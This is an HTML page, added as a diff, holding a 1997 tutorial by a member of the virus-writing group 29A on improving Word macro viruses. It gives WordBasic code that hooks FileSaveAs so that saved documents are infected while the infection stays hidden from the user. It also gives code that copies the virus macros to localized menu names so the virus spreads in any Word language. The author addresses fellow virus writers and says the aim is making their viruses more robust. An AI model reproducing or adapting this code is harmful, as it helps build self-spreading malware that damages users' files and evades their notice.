@@ -1,0 +1,332 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Macro virus trickz</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+3>Macro virus trickz<BR>
+</FONT><FONT SIZE=+1>Jacky Qwerty/29A</FONT></FONT></B></P></CENTER>
+
+<P>
+<HR WIDTH="100%"><p></P>
+
+<P>This article is not intended to be a tutorial for macro virus writin.
+It simply states some common problemz and known limitationz with actual
+macro virii, then sugests solutionz and provides some code examplez for
+them. The reader should be already familiar with some of the conceptz surroundin
+macro virii stuff. If not, i sugest to read first a &quot;real&quot; tutorial
+about the subject and then jump back to this article. </P>
+
+<P><B>Index</B></P>
+
+<OL>
+<LI><A HREF="#1">Introduction</A></LI>
+
+<LI><A HREF="#2">The &quot;SaveAs&quot; problem<BR>
+</A>2.1. <A HREF="#21">The &quot;SaveAs&quot; solution<BR>
+</A>2.2. <A HREF="#22">The &quot;SaveAs&quot; example</A></LI>
+
+<LI><A HREF="#3">The &quot;MultiLanguage suport&quot; problem<BR>
+</A>3.1. <A HREF="#31">The &quot;MultiLanguage suport&quot; solution<BR>
+</A>3.2. <A HREF="#32">The &quot;MultiLanguage suport&quot; example</A></LI>
+
+<LI><A HREF="#4">Final Note</A></LI>
+
+<LI><A HREF="#5">Disclaimer</A></LI>
+</OL>
+
+<P><A NAME="1"></A><B>1. Introduction </B></P>
+
+<P>One day while i was surfin the Web, unexpectedly found a couple of linkz
+containin Word macro virii stuff. After havin programed some DOS virii
+and researched about PE infection, one has to admit that the idea of a
+virus writen in WordBasic or VBA... mmm... well, sounds a bit stupid &gt;8P
+</P>
+
+<P>(DS1, NJ: dont get mad... &gt;8D) </P>
+
+<P>Indeed, macro virii seem stupid once u write one, but at that moment
+i had written none. After i downloaded and played with some of them, i
+actually understood not only how stupid macro virii were, but also Microsoft
+programerz. They're all clueless on what *security* means :) </P>
+
+<P><A NAME="2"></A><B>2. The &quot;SaveAs&quot; problem </B></P>
+
+<P>Just when i started to write my own macro virus, my atention was caught
+by an interestin mesage posted to alt.comp.virus. The topic was about that
+typical nuisance with macro virii that reveals their presence: the &quot;SaveAs&quot;
+problem. As i had thought, it was posible to overcome this, and that mesage
+from an expert AVer (well ehem) had just confirmed it. </P>
+
+<P>The &quot;SaveAs&quot; problem occurs when u try to save any infected
+document with another name usin the &quot;FileSaveAs&quot; command. After
+the &quot;SaveAs&quot; dialog box appears, u cant change the drive, nor
+the directory path, nor the format type. Word always saves your document
+in the &quot;templatez&quot; directory, unablin u to change it. This is
+bad for the common clueless user and bad for the virus too, as it reveals
+its presence by tellin him somethin is wrong. It also reduces its chancez
+to spread coz now the user cant take home his (infected) document as long
+as Word doesnt let him save documentz to his floppy disk, due to the &quot;SaveAs&quot;
+problem. </P>
+
+<P>I have thought of diferent wayz to overcome this, however i'll discuss
+the method i actually implemented in my WM.CAP virus. </P>
+
+<P><A NAME="21"></A><B>2.1. The &quot;SaveAs&quot; solution </B></P>
+
+<P>How do we solve this problem then? easy, very easy once we understand
+what an infected document really is. We cant forget that an infected document
+is really a &quot;template&quot;, that why Word doesnt let us change the
+drive, nor the directory path, nor the format type. Becoz its a &quot;template&quot;
+and templatez belong to the templatez directory! Ok, but what if we make
+Word think that the infected document, sorry i meant the infected &quot;template&quot;,
+is a genuine Word document? this would allow the user to select the drive,
+path and any type for the document! right? right! but how? </P>
+
+<P>Easy again, once we understand why Word provides &quot;templatez&quot;:
+to make user's life easier by creatin documentz based on such templatez,
+got it? All we have to do is create a new document based on our active
+infected template! in other wordz we have to &quot;emulate&quot; the &quot;SaveAs&quot;
+function as if Word were saving a genuine document. Lets write some code
+to ilustrate. </P>
+
+<P><A NAME="22"></A><B>2.2. The &quot;SaveAs&quot; example </B></P>
+
+<PRE> Sub FileSaveAs                      ' Our &quot;FileSaveAs&quot; macro
+   On Error Goto endFileSaveAs       '
+   Dim dlg As FileSaveAs             ' Declare dlg as FileSaveAs dialog box
+   GetCurValues dlg                  ' Get current values into dlg
+   If dlg.Format &lt;&gt; 1 Then           ' Not a template? (i.e. not infected?)
+     Dialog dlg                      '   No, a clean document, show box
+     FileSaveAs dlg                  '   Save the new document
+     Infect(dlg.Name)                '   Infect it! go!
+   Else                              ' It's a template (i.e. it's infected)
+     TempWindow = Window()           '   Get current window (template)
+     OriginalName$ = dlg.Name        '   Get original document name
+     FileNew .Template = FileName$() '   Create new doc based on template!
+     On Error Goto CloseDoc          '   Now on: if any error close new doc
+     GetCurValues dlg                '   Get current values for new doc
+     dlg.Name = OriginalName$        '   Change doc name for original one
+     Dialog dlg                      '   Ok, show FileSaveAs dialog box
+     FileSaveAs dlg                  '   Save the new document
+     On Error Goto endFileSaveAs     '   Now on: if any error just go
+     Infect(dlg.Name)                '   Ok, infect new document
+     If TempWindow &gt;= Window()       '
+       TempWindow = TempWindow + 1   '   Get old template window number
+     EndIf                           '
+     WindowList TempWindow           '   Make it the active window
+    CloseDoc:                        '
+     FileClose 2                     '   Close it without promptin
+   End If                            '
+  endFileSaveAs:                     ' We're done! &quot;SaveAs&quot; problem fixed!
+ End Sub                             '
+</PRE>
+
+<P>The trick here is that the &quot;FileSaveAs&quot; subroutine behaves
+diferently acordin to the object bein saved. If the object is a genuine
+Word document (i.e. not infected), the routine simply shows the &quot;SaveAs&quot;
+dialog box and tries to infect it afterwardz. If the object bein saved
+is a &quot;template&quot; (i.e. perhaps an infected document) then the
+routine first creates a new document based on that active template (which
+is actually the infected document itself) and then shows the &quot;SaveAs&quot;
+dialog box from this newly created clean document. This time Word allows
+to choose the format type, drive letter and directory namez. After the
+user chooses the document name and saves it, the routine simply infects
+the document, swaps to the window containin the old template (i.e. the
+old infected document) and finally closes it leavin open the new &quot;SavedAs&quot;
+document just as Word itself does. </P>
+
+<P>If at this point u're wonderin why we created a new &quot;empty&quot;
+document from the template, then u probably need some background info in
+Word macroz and templatez. The new created document is NOT &quot;empty&quot;
+as it was created from a template which was not empty. Remember that this
+template is really our infected document and as a result our new created
+document will contain the same text stuff as the template. Remember also
+the definition of what a &quot;template&quot; is and why we use them. </P>
+
+<P><A NAME="3"></A><B>3. The &quot;MultiLanguage suport&quot; problem </B></P>
+
+<P>This is a dificult topic and several diferent aproachez have been tried
+and implemented by different VXers in order to overcome it. However as
+to this writin, i still havent seen a single *reliable* multilanguage macro
+virus. The Wazzu virus consisted of a single automacro: AutoOpen. This
+makes it language-independent indeed but it still has the &quot;SaveAs&quot;
+problem, big deal. </P>
+
+<P>The &quot;MultiLanguage suport&quot; problem has to do with the fact
+that MS Word is available in diferent languagez and flavorz for diferent
+platformz. Whenever we give a macro the name of a menu item, Word will
+actually execute the code contained in such macro whenever the user clicks
+or presses the menu item asociated with it. However if the user executes
+the same action (clicks the same menu item) under another Word language,
+the asociated macro won't be executed at all becoz it doesnt match the
+menu item name as it was written in another language, u see? </P>
+
+<P>For example supose in english Word we program the &quot;FileOpen&quot;
+macro to do whatever action. Whenever we click the &quot;File/Open&quot;
+item, our macro will be executed. However supose we copy (unchanged) the
+same macro to another Word language, say spanish. Under this Word language
+the asociated file menu item changes now to &quot;Archivo/Abrir&quot;.
+If we click this menu item, our old &quot;FileOpen&quot; macro won't be
+executed at all. However if we rename the macro to &quot;ArchivoAbrir&quot;,
+this time it will execute just fine. This is what is known as the &quot;MultiLanguage
+suport&quot; problem. </P>
+
+<P><A NAME="31"></A><B>3.1. The &quot;MultiLanguage suport&quot; solution
+(without AutoMacroz) </B></P>
+
+<P>The best aproach to obtain multilanguage suport without losin control
+over the enviroment is interceptin the file menu related macroz, at least
+the &quot;FileSaveAs&quot; macro so we can fix the &quot;SaveAs&quot; problem.
+</P>
+
+<P>The best solution i came up with after thinkin a bit among the diferent
+alternativez was to intercept the file macroz directly acordin to the especific
+Word language instaled. This is not a dificult task, however what proves
+to be somewhat complicated is guessin out the correct macro name for the
+respective file menu item. If this step is done incorrectly, some file
+menuz will end up doin diferent actionz other than expected. For instance,
+the &quot;FileSave&quot; macro could end up callin &quot;FileClose&quot;,
+thus closin the document instead of saving it or viceversa. </P>
+
+<P>In order to get the macro namez for the actual Word language instaled,
+we must use the &quot;MenuItemMacro$&quot; function. This function gives
+us the macro name for a given menu item inside a menu, asumin we know of
+course which menu this menu item refers or belongs to and knowin the menu
+item name or the menu item position inside this menu itself. Heh are u
+drowsy? =8-S. </P>
+
+<P>This is precisely the reason why this method is still not 100% reliable.
+We must asume fixed menu item positionz for the menu itemz we wanna hook.
+In any Word language from any standard Word instalation we have the followin
+scenario (equivalent spanish macroz are also shown): </P>
+
+<PRE>    English        Spanish               Menu        Menu item position
+    -------        -------               ----        ------------------
+    FileOpen       ArchivoAbrir          1 (File)    2
+    FileClose      ArchivoCerrar         1 (File)    3
+    FileSave       ArchivoGuardar        1 (File)    5
+    FileSaveAs     ArchivoGuardarComo    1 (File)    6
+</PRE>
+
+<P>This is precisely the method implemented in the WM.CAP virus in order
+to work in any Word language. It created aditional macro namez with same
+body but diferent name -acordin to the actual Word language instaled- for
+a given macro function. The fact that the macro code remains the same in
+any Word language is not a problem. The macro interpreter inside Word is
+&quot;universal&quot;, meanin that it will execute correctly the WordBasic
+or VBA instructionz inside the macroz without carin about the actual Word
+language instaled. It needs however to refer to valid existin macro namez
+or labelz. As macro namez change for a given especific Word language, we
+must be very careful NOT to include any reference to a language-dependent
+macro name inside any of our file related macroz. This is the reason why
+such file related macroz inside WM.CAP are just short stubz (&quot;wraperz&quot;)
+that jump to other subroutinez inside the CAP macro itself. </P>
+
+<P>Before showin an example to the &quot;MultiLanguage suport&quot; method,
+i must warn once again that this method is not 100% reliable. It all depends
+on how much the user has customized his Word menuz and other setingz. It
+should however work just perfect on those Wordz havin the factory standard
+setingz which gracely share all Word instalationz by default. Again in
+some especific user-customized Word instalationz, the latter method can
+easily mess up some of the file related macroz, resultin in unexpected
+behavior and weird funny actionz. Here follows the &quot;MultiLanguage
+suport&quot; example. </P>
+
+<P><A NAME="32"></A><B>3.2. The &quot;MultiLanguage suport&quot; example
+</B></P>
+
+<PRE> Dim Shared MacroName$(N)       ' Array of stringz to hold the macro namez
+
+ Sub MAIN                       ' Main subroutine
+ [...]
+ MacroName$(2) = &quot;FileOpen&quot;     ' &quot;FileOpen&quot;   at position 2 in file menu
+ MacroName$(3) = &quot;FileClose&quot;    ' &quot;FileClose&quot;  at position 3 in file menu
+ MacroName$(5) = &quot;FileSave&quot;     ' &quot;FileSave&quot;   at position 5 in file menu
+ MacroName$(6) = &quot;FileSaveAs&quot;   ' &quot;FileSaveAs&quot; at position 6 in file menu
+
+ FileMenu$ = MenuText$(0, 1)    ' Get name for file menu (&quot;&amp;File&quot;)
+
+ For MacroNumber = CountMacros(1) To 1 Step - 1   ' Process each macro
+   Position = 0                                   ' No position by now
+   NameOfMacro$ = MacroName$(MacroNumber, 1)      ' Get macro name
+   Select Case MacroDesc$(NameOfMacro$)           ' Get description of
+                                                  '   macro name
+     Case &quot;FileOpen&quot;     ' Description = &quot;FileOpen&quot; ?
+       Position = 2      '   then position in file menu = 2
+     Case &quot;FileClose&quot;    ' Description = &quot;FileClose&quot; ?
+       Position = 3      '   then position in file menu = 3
+     Case &quot;FileSave&quot;     ' Description = &quot;FileSave&quot; ?
+       Position = 5      '   then position in file menu = 5
+     Case &quot;FileSaveAs&quot;   ' Description = &quot;FileSaveAs&quot; ?
+       Position = 6      '   then position in file menu = 6
+   End Select
+  
+   If Position Then      ' If position in file menu was found then..
+
+     LocalMacro$ = MenuItemMacro$(FileMenu$, 0, Position)  ' Get localized
+                                                           '   macro name
+     If Left$(UCase$(LocalMacro$), Len(MacroName$(Position)))
+          &lt;&gt; UCase$(MacroName$(Position))   ' If local macro name is
+        And                                 '   diferent from english name
+        Left$(LocalMacro$, 1)               '   and local macro name is NOT
+          &lt;&gt; &quot;(&quot;                            '   a separator &quot;(..&quot; then
+        Then
+       
+        MacroCopy F$ + &quot;:&quot; + NameOfMacro$, LocalMacro$, -1  ' Copy macro to
+                                                            '   localized
+     End If                                                 '   macro name
+   End If
+ Next                    ' Process next macro
+</PRE>
+
+<P>The objective in the previous example shows for itself. We're tryin
+to get the file related macro namez for any localized version of Word other
+than english. If these file related macroz are located in the exact position
+where we expect them to be in the file menu (very likely), then the above
+example will do its work. Probably at this point u're wonderin what has
+the macro description field to do in all this mess. Heh, well, the field
+proves to be very useful for some purposez other than simply describin
+what the macro does. The macro description field can be used to hold generation
+countz and self-recognition paternz, among other thingz. </P>
+
+<P>In the above example however, the description field mite not be necesary
+at all. Its purpose is simply to identify a given file related macro in
+order to assign a position for it in the file menu. But u could argue this
+can be done as well simply comparin the macro name retrieved from the &quot;MacroName$&quot;
+function with the required english macro name. Yes, u could, and it would
+work, as long as these english file related macroz keep stayin in the infected
+document. But u see, macro corruption, deletion and snatchin of macros
+are common nowadayz between macro virii due to the increasin number of
+existin samples of themselves. Becoz of this, the use of the macro description
+field (whenever posible) to recognize english or equivalent localized macro
+namez, makes the virus much more robust to macro corruptionz or undesired
+macro deletionz. </P>
+
+<P><A NAME="4"></A><B>4. Final note </B></P>
+
+<P>This article was written one or two months after Microsoft released
+its long expected Office'97, containin Word'97. Becoz of this and becoz
+i lost my interest in macro virii stuff since that time on, i dunno if
+these macro trickz will also work under Word'97, i guess not. However,
+if other VXerz are interested in these topicz and want to add more robustness
+to their macro virii under Word'97, they should consider the problemz described
+above. </P>
+
+<P>I hope this article could be useful for that purpose. Thats all, folkz.
+</P>
+
+<P><A NAME="5"></A><B>5. Disclaimer </B></P>
+
+<P>This information is for educational purposez only. The author is not
+responsible for any problemz caused by the use of this information. </P>
+
+<P>(c) 1997. Jacky Qwerty / <A HREF="groups1.htm#29A">29A</A>.</P>
+
+<P>
+<HR WIDTH="100%"><p></P>
+
+</BODY>
+</HTML>
